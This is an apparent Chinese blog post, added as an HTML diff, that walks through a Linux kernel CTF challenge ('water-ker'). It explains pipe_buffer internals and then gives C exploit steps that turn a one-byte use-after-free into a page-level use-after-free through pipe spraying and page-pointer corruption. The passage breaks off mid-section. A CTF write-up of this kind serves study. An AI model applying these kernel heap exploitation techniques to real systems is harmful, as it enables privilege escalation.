@@ -1,0 +1,1118 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第一次在比赛中尝试做kernel题（虽然没做出来），复现来哩~ 基本上是抄的D^3CTF2023 d3kcache的exp，学习一下这种利用方法   虽然已经不算速速了但我还是更了(・∀・(・∀・(・∀・)*">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 强网拟态 water-ker">
+<meta property="og:url" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="第一次在比赛中尝试做kernel题（虽然没做出来），复现来哩~ 基本上是抄的D^3CTF2023 d3kcache的exp，学习一下这种利用方法   虽然已经不算速速了但我还是更了(・∀・(・∀・(・∀・)*">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc3.jpg">
+<meta property="article:published_time" content="2023-11-30T07:13:13.000Z">
+<meta property="article:modified_time" content="2025-01-03T11:02:23.321Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc3.jpg">
+  
+  
+  
+  <title>2023 强网拟态 water-ker - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023 强网拟态 water-ker"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-30 15:13" pubdate>
+          2023年11月30日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023 强网拟态 water-ker</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>第一次在比赛中尝试做kernel题（虽然没做出来），复现来哩~</p>
+<p>基本上是抄的<a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023 d3kcache</a>的exp，学习一下这种利用方法</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/wjx.jpg" srcset="/img/loading.gif" lazyload class title="wjx">
+
+<p><em>虽然已经不算速速了但我还是更了(・∀・(・∀・(・∀・</em>)*</p>
+<span id="more"></span>
+
+<h1 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h1><p>在pipe系统调用中申请的结构体，用于存放pipe的数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>在alloc_pipe_info函数中会申请pipe_buffer（默认16）个pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>			     GFP_KERNEL_ACCOUNT);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在pipe_write中会给pipe_buffer-&gt;page申请一个page</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>		<span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><br>			<span class="hljs-keyword">if</span> (!page) &#123;<br>				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br>				<span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>					ret = ret ? : -ENOMEM;<br>					<span class="hljs-keyword">break</span>;<br>				&#125;<br>				pipe-&gt;tmp_page = page;<br>			&#125;<br><br>			buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>			buf-&gt;page = page;<br>			buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>			buf-&gt;offset = <span class="hljs-number">0</span>;<br>			buf-&gt;len = <span class="hljs-number">0</span>;<br>			<span class="hljs-keyword">if</span> (is_packetized(filp))<br>				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br>			<span class="hljs-keyword">else</span><br>				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>			pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>close一个pipe会在free_pipe_info释放pipe_buffer，如果一个buf-&gt;page的ref为0会在pipe_buf_release中free这个page</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_pipe_info</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> pipe-&gt;bufs + i;<br>		<span class="hljs-keyword">if</span> (buf-&gt;ops)<br>			pipe_buf_release(pipe, buf);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (pipe-&gt;tmp_page)<br>		__free_page(pipe-&gt;tmp_page);<br>	kfree(pipe-&gt;bufs);<br>	kfree(pipe);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>F_SETPIPE_SZ可以更改pipe_buffer的值达到任意大小分配的目的，在pipe_resize_ring函数中会申请新的pipe_buffer，复制内容并释放原来的pipe_buffer</p>
+<p>重新分配的大小是2^order * 0x1000，2^order就是pipe_buffer数组的大小</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>	bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br>	<span class="hljs-keyword">if</span> (unlikely(!bufs))<br>		<span class="hljs-keyword">return</span> -ENOMEM;<br><br>	<span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> h = head &amp; mask;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> t = tail &amp; mask;<br>		<span class="hljs-keyword">if</span> (h &gt; t) &#123;<br>			<span class="hljs-built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,<br>			       n * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tsize = pipe-&gt;ring_size - t;<br>			<span class="hljs-keyword">if</span> (h &gt; <span class="hljs-number">0</span>)<br>				<span class="hljs-built_in">memcpy</span>(bufs + tsize, pipe-&gt;bufs,<br>				       h * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>			<span class="hljs-built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,<br>			       tsize * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>		&#125;<br>	&#125;<br><br>	head = n;<br>	tail = <span class="hljs-number">0</span>;<br><br>	kfree(pipe-&gt;bufs);<br>	pipe-&gt;bufs = bufs;<br>	pipe-&gt;ring_size = nr_slots;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>漏洞就不说了(ˉ▽ˉ；)…，0x200的chunk，有一次一字节的uaf</p>
+<h2 id="构造页级uaf"><a href="#构造页级uaf" class="headerlink" title="构造页级uaf"></a>构造页级uaf</h2><p>可以把pipe_buffer分配到uaf的chunk，这样我们就能更改page成员的低字节，一个page结构体是0x40，只要把低字节改成0x40的倍数就可能使两个pipe_buffer-&gt;page指向同一个page</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page1.png" srcset="/img/loading.gif" lazyload class title="page1">
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page2.png" srcset="/img/loading.gif" lazyload class title="page2">
+
+<p>再把这个page释放掉我们就获得了一个uaf的page，再把这个page分配给其他的结构体就可以通过pipe管道的性质更改结构体的内容</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page3.png" srcset="/img/loading.gif" lazyload class title="page3">
+
+<p>来看exp</p>
+<ul>
+<li><p>一些准备工作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">save_status();<br>bind_core(<span class="hljs-number">0</span>);<br>fd_water = open(<span class="hljs-string">&quot;/dev/water&quot;</span>, O_RDWR);<br><span class="hljs-keyword">if</span>(fd_water &lt; <span class="hljs-number">0</span>)<br>    err_exit(<span class="hljs-string">&quot;Fail to open the device water!&quot;</span>);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>进行以上利用需要一些pipe_buffer-&gt;page是物理相邻的，把order 0的page消耗光就能从更高的order取page并进行分裂，这样就能获得相邻的page了，所以，简单粗暴地开喷！</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/alloc3-0.png" srcset="/img/loading.gif" lazyload class title="alloc3-0">
+
+<ul>
+<li><p>喷一些pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>分两波更改大小，分两波的原因</p>
+<ul>
+<li>后续write的时候会给buffer_pipe-&gt;page分配物理页，顺序和现在重新分配buffer_pipe一样</li>
+<li>前面分配的page可能不是物理连续的，而利用需要连续的物理页</li>
+<li>所以第一波分配先消耗一下不连续的物理页，之后的物理页就是连续的了</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] first extend pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br>&#125;<br>    <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] UAF...&quot;</span>);<br>add_chunk(<span class="hljs-string">&quot;Eurus&quot;</span>);<br>delete_chunk();<br>    <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] second extend pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>write一波，给pipe_buffer-&gt;page分配物理页，写入pipe_fd的编号便于寻找是否成功造成page重叠</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>利用uaf更改pipe_buffer-&gt;page的低字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] edit one...&quot;</span>);<br>edit_chunk(<span class="hljs-string">&quot;\x80&quot;</span>);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查找是否造成page重叠并确定victim pipe_buffer的序号victim_pid，如果读出的idx和实际的idx不一样则成功</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">int</span> nr;<br>    <br>    <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i)<br>    &#123;<br>        orig_pid = nr;<br>        victim_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>               victim_pid, orig_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(victim_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;Fail to find the orig!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="构造二级自写管道"><a href="#构造二级自写管道" class="headerlink" title="构造二级自写管道"></a>构造二级自写管道</h2><p>上文中我们已经有了页级uaf，现在可以用这个页分配结构体进行泄露和结构体改写了，这里依然选择pipe_buffer作为victim结构体</p>
+<ul>
+<li><p>kmalloc在对应kmem_cache的slab不够用时会向buddy system申请page做为新的slab，申请的page的order由kmem_cache结构体的oo成员的高16位决定</p>
+</li>
+<li><p>所以我们需要新的pipe_buffer数组的大小满足<strong>对应kmem_cache的oo高16位为0</strong>，这样才会将刚才uaf的page取回来作为slab分配，这也就是exp中snd_pipe_sz的计算逻辑，这里选择96的kmem_cache</p>
